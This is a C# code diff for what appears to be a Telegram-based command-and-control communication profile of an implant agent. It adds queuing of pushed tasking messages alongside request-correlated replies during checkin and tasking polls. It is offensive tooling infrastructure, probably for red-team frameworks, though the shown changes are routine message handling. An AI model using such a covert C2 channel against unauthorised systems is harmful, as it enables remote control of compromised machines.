@@ -14,6 +14,7 @@ public sealed class TelegramProfile : IProfile, IDisposable
     private readonly IMessageManager _messageManager;
     private readonly TelegramApiClient _telegram;
     private readonly ChunkAssembler _assembler = new();
+    private readonly Queue<string> _pushedPayloads = new();
     private readonly string _controllerBot = NormalizeUsername("%TG_CONTROLLER_BOT%");
     private readonly string _routeId = Guid.NewGuid().ToString("N");
     private readonly int _messageChecks = ParsePositiveInt("%TG_MESSAGE_CHECKS%", 10);
@@ -53,14 +54,14 @@ public sealed class TelegramProfile : IProfile, IDisposable
             try
             {
                 await SendPayloadAsync(payload, requestId, CancellationToken.None);
-                string? response = await ReceivePayloadAsync(requestId, CancellationToken.None);
-                if (response is null)
+                InboundPayload? response = await ReceivePayloadAsync(requestId, CancellationToken.None);
+                if (response is null || !response.CompletesRequest)
                 {
                     continue;
                 }
 
                 CheckinResponse? checkinResponse = JsonSerializer.Deserialize(
-                    _crypto.Decrypt(response),
+                    _crypto.Decrypt(response.Payload),
                     CheckinResponseJsonContext.Default.CheckinResponse);
                 if (checkinResponse is not null)
                 {
@@ -95,16 +96,19 @@ public sealed class TelegramProfile : IProfile, IDisposable
             try
             {
                 await SendPayloadAsync(pendingPayload, pendingRequestId, cancellationToken);
-                string? inbound = await ReceivePayloadAsync(pendingRequestId, cancellationToken);
+                InboundPayload? inbound = await ReceivePayloadAsync(pendingRequestId, cancellationToken);
                 if (inbound is not null)
                 {
                     GetTaskingResponse? tasking = JsonSerializer.Deserialize(
-                        _crypto.Decrypt(inbound),
+                        _crypto.Decrypt(inbound.Payload),
                         GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                     if (tasking is not null)
                     {
-                        pendingPayload = null;
-                        pendingRequestId = null;
+                        if (inbound.CompletesRequest)
+                        {
+                            pendingPayload = null;
+                            pendingRequestId = null;
+                        }
                         SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(tasking));
                     }
                 }
@@ -165,15 +169,21 @@ public sealed class TelegramProfile : IProfile, IDisposable
         }
     }
 
-    private async Task<string?> ReceivePayloadAsync(
+    private async Task<InboundPayload?> ReceivePayloadAsync(
         string requestId,
         CancellationToken cancellationToken)
     {
         for (int attempt = 0; attempt < _messageChecks; attempt++)
         {
+            if (_pushedPayloads.Count > 0)
+            {
+                return new InboundPayload(_pushedPayloads.Dequeue(), false);
+            }
+
             IReadOnlyList<TelegramUpdate> updates = await _telegram.GetUpdatesAsync(
                 _timeBetweenChecks,
                 cancellationToken);
+            string? correlatedPayload = null;
             foreach (TelegramUpdate update in updates)
             {
                 TelegramMessage? message = update.Message;
@@ -199,21 +209,46 @@ public sealed class TelegramProfile : IProfile, IDisposable
 
                 if (envelope is null ||
                     envelope.ToServer ||
-                    !string.Equals(envelope.ClientId, _routeId, StringComparison.Ordinal) ||
-                    !string.Equals(envelope.ReplyToPacketId, requestId, StringComparison.Ordinal))
+                    !string.Equals(envelope.ClientId, _routeId, StringComparison.Ordinal))
                 {
                     continue;
                 }
 
-                if (_assembler.TryAdd(envelope, out string assembled))
+                bool completesRequest = string.Equals(
+                    envelope.ReplyToPacketId,
+                    requestId,
+                    StringComparison.Ordinal);
+                bool isPushedTasking = string.IsNullOrEmpty(envelope.ReplyToPacketId);
+                if ((!completesRequest && !isPushedTasking) ||
+                    !_assembler.TryAdd(envelope, out string assembled))
                 {
-                    return assembled;
+                    continue;
                 }
+
+                if (completesRequest)
+                {
+                    correlatedPayload ??= assembled;
+                }
+                else
+                {
+                    _pushedPayloads.Enqueue(assembled);
+                }
+            }
+
+            if (correlatedPayload is not null)
+            {
+                return new InboundPayload(correlatedPayload, true);
+            }
+            if (_pushedPayloads.Count > 0)
+            {
+                return new InboundPayload(_pushedPayloads.Dequeue(), false);
             }
         }
 
         return null;
     }
+
+    private sealed record InboundPayload(string Payload, bool CompletesRequest);
 
     private static int ParsePositiveInt(string value, int fallback)
     {
